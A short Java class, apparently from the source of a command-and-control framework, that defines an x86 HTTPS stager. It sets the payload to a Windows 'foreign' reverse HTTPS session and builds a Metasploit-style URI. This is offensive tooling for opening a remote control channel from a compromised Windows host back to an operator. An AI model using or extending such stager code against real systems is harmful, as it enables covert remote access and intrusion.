package stagers;

import common.CommonUtils;
import common.ScListener;

public class ForeignHTTPSStagerX86 extends GenericHTTPSStagerX86 {
    public ForeignHTTPSStagerX86(ScListener scListener) {
        super(scListener);
    }

    public String payload() {
        return "windows/foreign/reverse_https";
    }

    public String getURI() {
        return CommonUtils.MSFURI(32);
    }
}
